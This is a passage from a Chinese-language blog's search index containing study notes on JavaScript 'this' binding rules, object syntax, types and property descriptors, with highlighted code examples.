<span class=\"title\">Manager</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> modules = &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">define</span>(<span class=\"params\">name, deps, impl</span>) </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">0</span>; i&lt;deps.length; i++) &#123;</span><br><span class=\"line\">\t\t\tdeps[i] = modules[deps[i]];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tmodules[name] = impl.apply( impl, deps );</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get</span>(<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> modules[name];</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">\t\tdefine: define,</span><br><span class=\"line\">\t\tget: get</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">&#125;)();</span><br></pre></td></tr></table></figure>\n","categories":["js"],"tags":["js"]},{"title":"this & 对象原型","url":"http://zhoushaw.github.io/2019/04/01/learning/book-notes/this&对象原型/","content":"<h2 id=\"一、this关键词\"><a href=\"#一、this关键词\" class=\"headerlink\" title=\"一、this关键词\"></a>一、this关键词</h2><p class=\"tip\">this是关键词，表示指向的索引位置</p>\n\n<p>很多人对于this最终指向常见的误解是，this是编写时绑定的，通常会将其认为成一下几种情况：</p>\n<p>1、认为this指向，foo函数</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo();</span><br></pre></td></tr></table></figure>\n<div><a id=\"more\"></a></div>\n\n<p>2、认为this指向，obj对象</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">console</span>.log( <span class=\"keyword\">this</span>.a );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">\ta: <span class=\"number\">2</span>,</span><br><span class=\"line\">\tfoo: foo</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> bar = obj.foo; <span class=\"comment\">// 函数引用！</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"string\">\"oops, global\"</span>; <span class=\"comment\">// `a` 也是一个全局对象的属性</span></span><br><span class=\"line\"></span><br><span class=\"line\">bar(); <span class=\"comment\">// \"oops, global\"</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"可以大致分为以下几种情况：\"><a href=\"#可以大致分为以下几种情况：\" class=\"headerlink\" title=\"可以大致分为以下几种情况：\"></a>可以大致分为以下几种情况：</h3><p>函数调用方式与内部this指针关系<br>1.直接调用:函数内部this指向全局对象window<br>2.通过对象使用点来调用:函数内部this指向调用对象<br>3.触发事件调用函数:函数内部的this指向触发事件的对象<br>4.以new的方式来调用:函数内部this指向本次函数执行时对应的一个匿名对象（以new的方式创建的函数，函数名的首字母一般以大写字母开始）<br>构造函数 ，是一种特殊的方法。主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。</p>\n<p>5.通过call的方法来间接调用方法:函数内部this指向call方法的第一参数对象<br>有点:我们可以创建结构相同，但内容不同的对象</p>\n<p>可参考: <a href=\"http://www.ruanyifeng.com/blog/2018/06/javascript-this.html\" target=\"_blank\" rel=\"noopener\">JavaScript 的this原理</a></p>\n<p>按照本文中的分类将其分为四大块：</p>\n<p>默认绑定、隐含绑定、明确绑定、new 绑定</p>\n<h3 id=\"仅仅是规则\"><a href=\"#仅仅是规则\" class=\"headerlink\" title=\"仅仅是规则\"></a>仅仅是规则</h3><p>this的最终指向可以将其分为大致四种规则</p>\n<h4 id=\"默认绑定\"><a href=\"#默认绑定\" class=\"headerlink\" title=\"默认绑定\"></a>默认绑定</h4><p>我们要考察的第一种规则源于函数调用的最常见的情况：独立函数调用</p>\n<p>在非<code>strict mode</code>模式下，独立函数调用默认指向全局对象window，在<code>strict mode</code>模式下默认绑定 来说全局对象是不合法，所以 <code>this</code> 将被设置为 <code>undefined</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\tconsole.log( this.a );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var a = 2;</span><br><span class=\"line\"></span><br><span class=\"line\">foo(); // 2</span><br></pre></td></tr></table></figure>\n<h4 id=\"隐含绑定\"><a href=\"#隐含绑定\" class=\"headerlink\" title=\"隐含绑定\"></a>隐含绑定</h4><p>另一种要考虑的规则是：调用点是否有一个环境对象（<code>context object</code>），也称为拥有者（<code>owning</code>）或容器（<code>containing</code>）对象</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\tconsole.log( this.a );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">\ta: 2,</span><br><span class=\"line\">\tfoo: foo</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">obj.foo(); // 2</span><br></pre></td></tr></table></figure>\n<p class=\"tip\">无论 foo() 是否一开始就在 obj 上被声明，还是后来作为引用添加（如上面代码所示），这个 函数 都不被 obj 所真正“拥有”或“包含”.调用点 使用 obj 环境来 引用 函数，所以你 可以说 obj 对象在函数被调用的时间点上“拥有”或“包含”这个 函数引用。</p>\n\n\n<p>只有对象属性引用链的最后一层是影响调用点的。比如：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\tconsole.log( this.a );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var obj2 = &#123;</span><br><span class=\"line\">\ta: 42,</span><br><span class=\"line\">\tfoo: foo</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">var obj1 = &#123;</span><br><span class=\"line\">\ta: 2,</span><br><span class=\"line\">\tobj2: obj2</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">obj1.obj2.foo(); // 42</span><br></pre></td></tr></table></figure>\n<h5 id=\"隐含丢失\"><a href=\"#隐含丢失\" class=\"headerlink\" title=\"隐含丢失\"></a>隐含丢失</h5><p>传递一个回调函数时：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\tconsole.log( this.a );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function doFoo(fn) &#123;</span><br><span class=\"line\">\t// `fn` 只不过 `foo` 的另一个引用</span><br><span class=\"line\"></span><br><span class=\"line\">\tfn(); // &lt;-- 调用点!</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">\ta: 2,</span><br><span class=\"line\">\tfoo: foo</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">var a = &quot;oops, global&quot;; // `a` 也是一个全局对象的属性</span><br><span class=\"line\"></span><br><span class=\"line\">doFoo( obj.foo ); // &quot;oops, global&quot;</span><br></pre></td></tr></table></figure>\n<p>那么如果接收你所传递回调的函数不是你的，而是语言内建的呢？没有区别，同样的结果。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\tconsole.log( this.a );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">\ta: 2,</span><br><span class=\"line\">\tfoo: foo</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">var a = &quot;oops, global&quot;; // `a` 也是一个全局对象的属性</span><br><span class=\"line\"></span><br><span class=\"line\">setTimeout( obj.foo, 100 ); // &quot;oops, global&quot;</span><br></pre></td></tr></table></figure>\n<p>正如我们刚刚看到的，我们的回调函数丢掉他们的 this 绑定是十分常见的事情。但是 this 使我们吃惊的另一种方式是，接收我们回调的函数故意改变调用的 this。那些很流行的 JavaScript 库中的事件处理器就十分喜欢强制你的回调的 this 指向触发事件的 DOM 元素。虽然有时这很有用，但其他时候这简直能气死人。不幸的是，这些工具很少给你选择。</p>\n<h4 id=\"明确绑定\"><a href=\"#明确绑定\" class=\"headerlink\" title=\"明确绑定\"></a>明确绑定</h4><p>JavaScript 语言中的“所有”函数都有一些工具。具体地说，函数拥有 call(..) 和 apply(..) 方法。</p>\n<p>这些工具如何工作？它们接收的第一个参数都是一个用于 this 的对象，之后使用这个指定的 this 来调用函数。因为你已经直接指明你想让 this 是什么，所以我们称这种方式为 明确绑定（explicit binding)。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\tconsole.log( this.a );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">\ta: 2</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">foo.call( obj ); // 2</span><br></pre></td></tr></table></figure>\n<h5 id=\"API-调用的“环境”\"><a href=\"#API-调用的“环境”\" class=\"headerlink\" title=\"API 调用的“环境”\"></a>API 调用的“环境”</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo(el) &#123;</span><br><span class=\"line\">\tconsole.log( el, this.id );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">\tid: &quot;awesome&quot;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 使用 `obj` 作为 `this` 来调用 `foo(..)`</span><br><span class=\"line\">[1, 2, 3].forEach( foo, obj ); // 1 awesome  2 awesome  3 awesome</span><br></pre></td></tr></table></figure>\n<h4 id=\"new-绑定\"><a href=\"#new-绑定\" class=\"headerlink\" title=\"new 绑定\"></a>new 绑定</h4><p>当使用 new 操作符来初始化一个类时，这个类的构造器就会被调用。通常看起来像这样：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">something = new MyClass(..);</span><br></pre></td></tr></table></figure>\n<p class=\"tip\">实际上 JavaScript 的机制和 new 在 JS 中的用法所暗示的面向类的功能 没有任何联系。在 JS 中，构造器 仅仅是一个函数，它们偶然地与前置的 new 操作符一起调用。它们不依附于类，它们也不初始化一个类。它们甚至不是一种特殊的函数类型。它们本质上只是一般的函数，在被使用 new 来调用时改变了行为。</p>\n\n<blockquote>\n<p>当在函数前面被加入 new 调用时，也就是构造器调用时，下面这些事情会自动完成：</p>\n</blockquote>\n<ul>\n<li>一个全新的对象会凭空创建（就是被构建）</li>\n<li>这个新构建的对象会被接入原形链（[[Prototype]]-linked）</li>\n<li>这个新构建的对象被设置为函数调用的 this 绑定</li>\n<li>除非函数返回一个它自己的其他 对象，否则这个被 new 调用的函数将 自动 返回这个新构建的对象。</li>\n</ul>\n<p>简单来说通过new方法初始化的构造器this指向函数本身</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo(a) &#123;</span><br><span class=\"line\">\tthis.a = a;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var bar = new foo( 2 );</span><br><span class=\"line\">console.log( bar.a ); // 2</span><br></pre></td></tr></table></figure>\n<h3 id=\"一切皆有顺序\"><a href=\"#一切皆有顺序\" class=\"headerlink\" title=\"一切皆有顺序\"></a>一切皆有顺序</h3><p class=\"tip\">上面已经揭示了四种this绑定最终指向的规则，但是指向的规则可能会出现重叠的情况，当两种以上的规则出现后如何抉择优先顺序呢。</p>\n\n<ul>\n<li>函数是通过 new 被调用的吗（new 绑定）？如果是，this 就是新构建的对象。<ul>\n<li>var bar = new foo()</li>\n</ul>\n</li>\n<li>函数是通过 call 或 apply 被调用（明确绑定），甚至是隐藏在 bind 硬绑定 之中吗？如果是，this 就是那个被明确指定的对象。<ul>\n<li>var bar = foo.call( obj2 )</li>\n</ul>\n</li>\n<li>函数是通过环境对象（也称为拥有者或容器对象）被调用的吗（隐含绑定）？如果是，this 就是那个环境对象。<ul>\n<li>var bar = obj1.foo()</li>\n</ul>\n</li>\n<li>否则，使用默认的 this（默认绑定）。如果在 strict mode 下，就是 undefined，否则是 global 对象。<ul>\n<li>var bar = foo()</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"绑定的特例\"><a href=\"#绑定的特例\" class=\"headerlink\" title=\"绑定的特例\"></a>绑定的特例</h3><p>正如通常的那样，对于“规则”总有一些 例外。</p>\n<h4 id=\"被忽略的-this\"><a href=\"#被忽略的-this\" class=\"headerlink\" title=\"被忽略的 this\"></a>被忽略的 this</h4><p class=\"tip\">如果你传递 null 或 undefined 作为 call、apply 或 bind 的 this 绑定参数，那么这些值会被忽略掉，取而代之的是 默认绑定 规则将适用于这个调用。</p>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\tconsole.log( this.a );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var a = 2;</span><br><span class=\"line\"></span><br><span class=\"line\">foo.call( null ); // 2</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>更安全的 this</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo(a,b) &#123;</span><br><span class=\"line\">\tconsole.log( &quot;a:&quot; + a + &quot;, b:&quot; + b );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 我们的 DMZ 空对象</span><br><span class=\"line\">var ø = Object.create( null );</span><br><span class=\"line\"></span><br><span class=\"line\">// 将数组散开作为参数</span><br><span class=\"line\">foo.apply( ø, [2, 3] ); // a:2, b:3</span><br><span class=\"line\"></span><br><span class=\"line\">// 用 `bind(..)` 进行 currying</span><br><span class=\"line\">var bar = foo.bind( ø, 2 );</span><br><span class=\"line\">bar( 3 ); // a:2, b:3</span><br></pre></td></tr></table></figure>\n<p>可以通过让其指向一个空对象，使其按照<code>硬绑定</code>原则进行</p>\n<h4 id=\"间接\"><a href=\"#间接\" class=\"headerlink\" title=\"间接\"></a>间接</h4><p>通过赋值</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\tconsole.log( this.a );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var a = 2;</span><br><span class=\"line\">var o = &#123; a: 3, foo: foo &#125;;</span><br><span class=\"line\">var p = &#123; a: 4 &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">o.foo(); // 3</span><br><span class=\"line\">(p.foo = o.foo)(); // 2</span><br></pre></td></tr></table></figure>\n<h3 id=\"词法this\"><a href=\"#词法this\" class=\"headerlink\" title=\"词法this\"></a>词法this</h3><blockquote>\n<p>一个箭头函数的词法绑定是不能被覆盖</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">  // 返回一个箭头函数</span><br><span class=\"line\">\treturn (a) =&gt; &#123;</span><br><span class=\"line\">    // 这里的 `this` 是词法上从 `foo()` 采用的</span><br><span class=\"line\">\t\tconsole.log( this.a );</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var obj1 = &#123;</span><br><span class=\"line\">\ta: 2</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">var obj2 = &#123;</span><br><span class=\"line\">\ta: 3</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">var bar = foo.call( obj1 );</span><br><span class=\"line\">bar.call( obj2 ); // 2, 不是3!</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>它们本质是使用广为人知的词法作用域来禁止了传统的 <code>this</code> 机制</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\tvar self = this; // 词法上捕获 `this`</span><br><span class=\"line\">\tsetTimeout( function()&#123;</span><br><span class=\"line\">\t\tconsole.log( self.a );</span><br><span class=\"line\">\t&#125;, 100 );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">\ta: 2</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">foo.call( obj ); // 2</span><br></pre></td></tr></table></figure>\n<h2 id=\"二、对象\"><a href=\"#二、对象\" class=\"headerlink\" title=\"二、对象\"></a>二、对象</h2><p>前面我们讲解了 this 绑定如何根据函数调用的调用点指向不同的对象。但究竟什么是对象，为什么我们需要指向它们？</p>\n<h3 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"语法\"></a>语法</h3><p class=\"tip\">对象来自于两种形式：声明（字面）形式，和构造形式。</p>\n\n\n<blockquote>\n<p>一个对象的字面语法看起来像这样：</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var myObj = &#123;</span><br><span class=\"line\">\tkey: value</span><br><span class=\"line\">\t// ...</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>构造形式看起来像这样：</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var myObj = new Object();</span><br><span class=\"line\">myObj.key = value;</span><br></pre></td></tr></table></figure>\n<p>构造形式和字面形式的结果是完全同种类的对象。唯一真正的区别在于你可以向字面声明一次性添加一个或多个键/值对，而对于构造形式，你必须一个一个地添加属性。</p>\n<h3 id=\"类型\"><a href=\"#类型\" class=\"headerlink\" title=\"类型\"></a>类型</h3><blockquote>\n<p>JS 的六种主要类型</p>\n</blockquote>\n<ul>\n<li>string</li>\n<li>number</li>\n<li>boolean</li>\n<li>null</li>\n<li>undefined</li>\n<li>object</li>\n</ul>\n<blockquote>\n<p>内建对象</p>\n</blockquote>\n<ul>\n<li>String</li>\n<li>Number</li>\n<li>Boolean</li>\n<li>Object</li>\n<li>Function</li>\n<li>Array</li>\n<li>Date</li>\n<li>RegExp</li>\n<li>Error</li>\n</ul>\n<h3 id=\"基本字面量\"><a href=\"#基本字面量\" class=\"headerlink\" title=\"基本字面量\"></a>基本字面量</h3><p>在JavaScript中基本字面量会转换成对象</p>\n<p class=\"tip\">一般来说，我们通过基本字面量：<code>let str = &#39;hello world&#39;;</code>创建的字符串，他只是个基本类型按道理来说不存在属性，但通过<code>str.length</code>却可以轻松渠道str字符串的长度，这是怎么回事呢，原来JavaScript会将<strong>字面量形式的str</strong>，转变成<code>String</code>对象形式的字符串</p>\n\n<blockquote>\n<p>基本字面量转变成对象的类型</p>\n</blockquote>\n<ul>\n<li>String</li>\n<li>Number</li>\n<li>Boolean</li>\n<li>RegExp</li>\n</ul>\n<blockquote>\n<p>深浅拷贝</p>\n</blockquote>\n<p>在进行深浅拷贝前，我们先明确，基本数据类型和复杂类型赋值的不同：</p>\n<ul>\n<li>在我们进行赋值操作的时候，基本数据类型的赋值（=）是在内存中新开辟一段栈内存，然后再把再将值赋值到新的栈中</li>\n<li>但是引用类型的赋值是传址。只是改变指针的指向，例如，也就是说引用类型的赋值是对象保存在栈中的地址的赋值，这样的话两个变量就指向同一个对象，因此两者之间操作互相有影响</li>\n</ul>\n<blockquote>\n<p>赋值（=）和浅拷贝的区别</p>\n</blockquote>\n<p>浅复制只会将对象的各个属性进行依次复制，并不会进行递归复制，而 JavaScript 存储对象都是存地址的，所以浅复制会导致赋值后的对象属性指向同一个内存地址</p>\n<h3 id=\"属性描述符\"><a href=\"#属性描述符\" class=\"headerlink\" title=\"属性描述符\"></a>属性描述符</h3><blockquote>\n<p>获取对象属性性质</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var myObject = &#123;</span><br><span class=\"line\">\ta: 2</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">Object.getOwnPropertyDescriptor( myObject, &quot;a&quot; );</span><br><span class=\"line\">// &#123;</span><br><span class=\"line\">//    value: 2,</span><br><span class=\"line\">//    writable: true,</span><br><span class=\"line\">//    enumerable: true,</span><br><span class=\"line\">//    configurable: true</span><br><span class=\"line\">// &#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>明确定义一个属性</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var myObject = &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">Object.defineProperty( myObject, &quot;a&quot;, &#123;</span><br><span class=\"line\">\tvalue: 2,</span><br><span class=\"line\">\twritable: true,</span><br><span class=\"line\">\tconfigurable: true,</span><br><span class=\"line\">\tenumerable: true</span><br><span class=\"line\">&#125; );</span><br><span class=\"line\"></span><br><span class=\"line\">myObject.a; // 2</span><br></pre></td></tr></table></figure>\n<p class=\"tip\">使用 defineProperty(..)，我们手动、明确地在 myObject 上添加了一个直白的，普通的 a 属性。然而，你通常不会使用这种手动方法，除非你想要把描述符的某个性质修改为不同的值。</p>\n\n\n<blockquote>\n<p>修改属性性质</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var myObject = &#123;</span><br><span class=\"line\">    a: 2</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">Object.defineProperty( myObject, &quot;a&quot;, &#123;</span><br><span class=\"line\">\tvalue: 2, </span><br><span class=\"line\">\twritable: true,</span><br><span class=\"line\">\tconfigurable: true,</span><br><span class=\"line\">\tenumerable: true </span><br><span class=\"line\">&#125; );</span><br></pre></td></tr></table></figure>\n<ul>\n<li>value<ul>\n<li>默认值：设置的初始值</li>\n</ul>\n</li>\n<li>writable<ul>\n<li>可修改性</li>\n<li>默认值：true</li>\n<li>将属性设置true后，修改属性值，将会发生<code>TypeError</code>(如果你试图改变一个不可配置属性的描述符定义，就会发生 